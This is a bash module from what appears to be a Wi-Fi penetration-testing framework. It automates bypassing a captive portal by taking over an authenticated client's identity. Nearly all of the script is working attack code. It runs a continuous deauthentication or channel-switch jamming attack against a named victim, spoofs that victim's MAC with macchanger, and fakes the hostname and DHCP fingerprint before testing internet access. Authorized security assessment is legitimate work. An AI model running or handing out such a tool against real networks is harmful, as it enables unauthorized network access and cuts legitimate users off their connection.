#!/usr/bin/env bash
# MODULE_META
# NAME="Captive Portal Bypass"
# CATEGORY="F"
# DEPS="A4"
# CRITICAL="no"
# TOOLS="macchanger,curl,aireplay-ng,mdk4"
# DESC="Bypass captive portal via MAC spoofing of authenticated clients"
# REQS="managed_iface,target_ssid"
# PCAP="no"
# DECODE="none"

#===============================================================================
#  modules/f4_portal_bypass.sh
#  F4: Captive Portal Bypass (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Identify authenticated MACs from A4 Client Fingerprinting.
#  2. Use TARGET_CLIENT provided by Go brain.
#  3. Deauthenticate/Suppress the victim to prevent ACK storms/collisions.
#  4. Spoof local identity (MAC + Hostname + DHCP Fingerprint).
#===============================================================================

set -euo pipefail

# Intelligence Insight (Colors)
C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_ACTION="${ASTRA_COLOR_ACTION:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"

# Inputs from Environment
INTERFACE="${WIFI_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
TARGET_BSSID="${GUEST_BSSID:-}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="F4"
TARGET_CLIENT="${TARGET_CLIENT:-}"

if [[ -z "$INTERFACE" ]]; then
    echo "[!] WIFI_INTERFACE not set."
    exit 1
fi

if [[ -z "$TARGET_CLIENT" ]]; then
    echo "[!] No target client specified. Identity spoofing requires a victim MAC."
    exit 0
fi

echo -e "${C_PROMPT}[*]${C_RESET} Starting identity spoofing bypass for: ${C_VAR}$TARGET_CLIENT${C_RESET}"

# 1. Roaming / Suppression
# If possible, we suppress the victim in the background
if [[ -n "$TARGET_BSSID" ]]; then
    if command -v mdk4 &>/dev/null; then
        echo -e "[*] Starting ${C_BOLD}PMF-resilient suppression (mdk4 CSA)${C_RESET} in background..."
        # mdk4 b -c: Force clients to roam to a non-existent channel (14)
        mdk4 "$INTERFACE" b -n "$SSID" -c 14 > /dev/null 2>&1 &
        SUPPRESS_PID=$!
    else
        echo -e "[*] Starting legacy deauth suppression in background..."
        aireplay-ng --deauth 0 -a "$TARGET_BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > /dev/null 2>&1 &
        SUPPRESS_PID=$!
    fi
    trap 'kill $SUPPRESS_PID 2>/dev/null || true' EXIT
fi

# 2. Spoofing Execution
echo -e "[*] Executing Full Identity Spoofing for ${C_VAR}$TARGET_CLIENT${C_RESET}..."
ip link set "$INTERFACE" down
macchanger -m "$TARGET_CLIENT" "$INTERFACE"

OLD_HOSTNAME=$(hostname)
SPOOFED_HOSTNAME="iPad-of-$(echo $TARGET_CLIENT | cut -d: -f5,6 | tr -d ':')"
echo -e "[*] Temporarily spoofing hostname to ${C_VAR}$SPOOFED_HOSTNAME${C_RESET}..."
hostname "$SPOOFED_HOSTNAME"
trap "hostname $OLD_HOSTNAME; kill ${SUPPRESS_PID:-} 2>/dev/null || true" EXIT

ip link set "$INTERFACE" up

DHCP_CONF="${EVIDENCE_DIR}/f4_dhclient.conf"
cat <<EOF > "$DHCP_CONF"
send host-name "$SPOOFED_HOSTNAME";
request subnet-mask, broadcast-address, time-offset, routers,
        domain-name, domain-name-servers, domain-search, host-name,
        netbios-name-servers, netbios-scope, interface-mtu,
        rfc3442-classless-static-routes, ntp-servers;
EOF

echo -e "[*] Requesting DHCP lease with custom Fingerprint (Option 55)..."
timeout 15 dhclient -v -cf "$DHCP_CONF" "$INTERFACE" || true

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 80 --status "Verifying network access..."

# 3. Verification
echo -e "[*] Verifying internet access..."
BYPASS_LOG="${EVIDENCE_DIR}/${TC_ID}_bypass.log"
if curl -s --connect-timeout 5 http://www.google.com > /dev/null; then
    echo -e "[!] ${C_BOLD}SUCCESS: CAPTIVE PORTAL BYPASSED!${C_RESET}" | tee -a "$BYPASS_LOG"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "Captive Portal Bypass Successful" \
        --severity CRITICAL \
        --desc "Successfully bypassed captive portal for SSID $SSID by spoofing authenticated MAC $TARGET_CLIENT." \
        --target "$SSID" \
        --evidence "$BYPASS_LOG" \
        --rationale "Identity cloning allows unauthorized access to restricted guest segments."
else
    echo -e "[+] Mission complete. Unrestricted access not achieved."
fi

exit 0
0
